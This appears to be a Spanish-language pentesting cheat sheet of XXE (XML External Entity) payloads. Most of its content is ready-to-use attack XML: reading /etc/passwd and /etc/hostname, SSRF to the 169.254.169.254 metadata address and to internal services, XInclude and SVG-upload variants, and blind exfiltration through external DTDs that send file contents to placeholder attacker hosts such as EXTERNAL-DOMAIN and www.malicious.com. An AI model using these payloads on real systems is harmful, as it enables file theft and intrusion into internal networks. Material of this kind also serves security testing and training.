# XML External Entity

- [XML External Entity](#xml-external-entity)
- [Payloads basicos](#payloads-basicos)
    - [Sintaxis común](#sintaxis-com%C3%BAn)
    - [Acceso a archivos y SSRF](#acceso-a-archivos-y-ssrf)
- [XXE Blind](#xxe-blind)
    - [Out of Band](#out-of-band)
    - [Data Exfiltration](#data-exfiltration)
- [XXE to SSRF](#xxe-to-ssrf)
- [XInclude Attack](#xinclude-attack)
- [Image file upload](#image-file-upload)




# Payloads basicos

La sintaxis que usaremos normalmente será 
````xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "ACTION"> ]>
````
Es una declaración de tipo de documento (DOCTYPE) en XML que define un nuevo tipo de documento llamado "test". La segunda línea define una entidad externa llamada "xxe" que utiliza el protocolo "file" para apuntar al archivo "/etc/passwd" en el sistema de archivos local.

De esta manera podríamos conseguir acceso a archivos o hacer un ssrf dependiendo del protocolo que utilicemos 
````xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
````
En ambos casos para llamar a la entidad se debe establecer como valor en uno de los campos de XML de esta manera: `&xxe;`

````xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://evil.com"> ]>
    <stockCheck>
        <productId>
            &xxe;
        </productId>
        <storeId>
            1
        </storeId>
    </stockCheck>
````

# XXE Blind
## Out of band 
La manera mas facil de confirmar un Blind XXE es intentado cargar un recurso remoto
````xml
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://EXTERNAL-DOMAIN"> ]>

#XML Parameters

<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://EXTERNAL-DOMAIN"> %xxe; ]>

````
## Data Exfiltration
````xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://EXTERNAL-DOMAIN/?x=%file;'>">
%eval;
%exfil;
````
> Este código XML define una entidad llamada `file` que hace referencia al archivo "/etc/hostname" en el sistema de archivos de la máquina. Luego define una entidad `eval` que contiene un fragmento de código XML que a su vez define una entidad `exfil`, que tiene una URL construida con la cadena de consulta `x=%file;`. Finalmente, se utilizan las entidades "eval" y "exfil" para enviar la información del archivo solicitado a través de una solicitud HTTP GET a nuestro servidor de preferencia para ver el resultado.

Una vez guardado este código en el servidor de explotación para que la entidad exfil pueda enviar la información obtenida del archivo en el sistema a través de nuestro dominio malicioso y confirmar la vulnerabilidad, vamos a enviar una entidad xxe para que se ejecute el codigo.

````xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
````

Otro ejemplo en este caso todo en la misma request
````xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
<!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
]
>
<foo>&callhome;</foo>
````
> El DTD personalizado se utiliza para incluir la entidad externa en la respuesta del servidor.

# XXE to SSRF

````xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "http://internal.service/secret_pass.txt" >
]>
<foo>&xxe;</foo>
````
# XInclude Attack

 Cuando no podemos usar el elemento DOCTYPE usame XInclude en el target
````xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
````
El prefijo `xmlns` se refiere a "XML namespace", lo que significa que se está declarando un espacio de nombres XML.

El prefijo `xi` es simplemente un nombre corto que se usa para referirse al espacio de nombres.

La URL http://www.w3.org/2001/XInclude es la ubicación de la especificación oficial del estándar XInclude. Al definir el prefijo xi para este espacio de nombres, se indica que se va a utilizar la especificación de XInclude en esta sección del documento.

El código inyectado crea un elemento XML foo con un espacio de nombres xi asociado a la especificación XInclude. Dentro de foo, se utiliza la directiva xi:include para incluir el contenido del archivo /etc/passwd, especificando la ubicación del archivo con href="file:///etc/passwd".

# Image file upload
````xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
````

